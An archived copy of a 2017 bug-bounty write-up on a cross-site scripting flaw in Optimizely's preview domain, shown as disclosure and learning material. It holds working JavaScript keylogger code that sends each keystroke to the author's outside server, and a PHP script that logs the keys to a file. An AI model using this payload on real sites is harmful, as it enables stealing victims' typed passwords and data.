---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2017-09-02_dont-just-alert1-because-xss-is-for-fun.md
original_filename: 2017-09-02_dont-just-alert1-because-xss-is-for-fun.md
title: Don’t just alert(1) , Because XSS is for fun…!!
category: documents
detected_topics:
- xss
- command-injection
tags:
- imported
- documents
- xss
- command-injection
language: en
raw_sha256: abc6357da07a95057c5fa9b942d0730abdb89527681c419bc3ce0ed3011382b3
text_sha256: ea248db7fd42753963306f6a4074869c0f093979ca5c1364159dcb81f6442b18
ingested_at: '2026-06-28T07:31:56Z'
sensitivity: unknown
redactions_applied: false
---

# Don’t just alert(1) , Because XSS is for fun…!!

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2017-09-02_dont-just-alert1-because-xss-is-for-fun.md
- Source Type: markdown
- Detected Topics: xss, command-injection
- Ingested At: 2026-06-28T07:31:56Z
- Redactions Applied: False
- Raw SHA256: `abc6357da07a95057c5fa9b942d0730abdb89527681c419bc3ce0ed3011382b3`
- Text SHA256: `ea248db7fd42753963306f6a4074869c0f093979ca5c1364159dcb81f6442b18`


## Content

---
title: "Don’t just alert(1) , Because XSS is for fun…!!"
url: "https://medium.com/@armaanpathan/dont-just-alert-1-because-xss-is-for-fun-f88cfb88d5b9"
authors: ["Armaan Pathan (@armaancrockroax)"]
programs: ["Optimizely"]
bugs: ["XSS"]
publication_date: "2017-09-02"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6111
scraped_via: "browseros"
---

# Don’t just alert(1) , Because XSS is for fun…!!

Don’t just alert(1) , Because XSS is for fun…!!
Armaan Pathan
Follow
3 min read
·
Sep 2, 2017

246

1

Press enter or click to view image in full size

It was weekend and i was reading some good blogs and looking for good tweets.So after reading some good blog i had decided to give them a try. so this time i chose cobalt.io because i had never hunted on this platform so why not give a try.

I had selected my target. which was www.optimizely.com and started looking for some cool bugs.

In the application i had found a module which is Create Experiment

Press enter or click to view image in full size

here you have to enter your website’s URL and give a name and you can do experiments on your website.

So simply i had fill up the form by entering my website and given the Experiment name.and my website was loaded into the module, now here i was able to do experiments on my web application.

Now there was an option to preview your experiments, Now this option will open the new tab and it will show the experiments which you have done with your application, so first i had not done any experiments and clicked on Preview. So it has opened www.optimizelypriview.com/www.mysite.com in the new tab and it has opened my website into it.

Now as it was loading my website within this so i though lets give a try.

i had wrote <script>prompt(docoument.domain);</script> into my site and again i put my site into the experiments.and again i clicked on preview.it has opened www.optimizelypriview.com/www.mysite.com in the new tab, but at this time instead of prompting my domain’s name into the pop-up it has prompted www.optimizelypriview.com. :) so yes here i was able to call scripts on the www.optimizelypriview.com from the different domain.

Press enter or click to view image in full size

I wanted to exploit this xss. so i decided to write small javascript which records the key strokes and give that strokes back to my server where i have hosted my website.

Get Armaan Pathan’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

So i wrote this to record the keystrokes

document.onkeypress = function(evt) {
evt = evt || window.event
key = String.fromCharCode(evt.charCode)
if (key) {
var http = new XMLHttpRequest();
var param = encodeURI(key)
http.open(“POST”,”http://armaanpathan.pe.hu/exploit.php",true);
http.setRequestHeader(“Content-type”,”application/x-www-form-urlencoded”);
http.send(“key=”+param);
}
}

and also wrote this to give that keystrokes back to my server and make keylog.txt file and save the keystrokes.

<?php
$key=$_POST[‘key’];
$logfile=”keylog.txt”;
$fp = fopen($logfile, “a”);
fwrite($fp, $key);
fclose($fp);
?>

and after writing this i had updated my website. now what this do, as soon as the page loads the javascript starts recording the keystrokes and makes a file keylog.txt and saves all the logs.

now again i put my site into the experiments.and again i clicked on preview.it has opened www.optimizelypriview.com/www.mysite.com. and it has started logging key logs to my server and made a file keylog.txt

Press enter or click to view image in full size

and if now if i send this link to any victim it starts logging all keystrokes which victim types. and if i open the keylog.txt file it will look like this.

Press enter or click to view image in full size

but unfortunately the team www.optimizely.com said that this domain is not in the scope :(.

but yeah. i had learn many things from this. :D

I hope you guys have like it. :)
Thanks for reading.
Have Great Day.
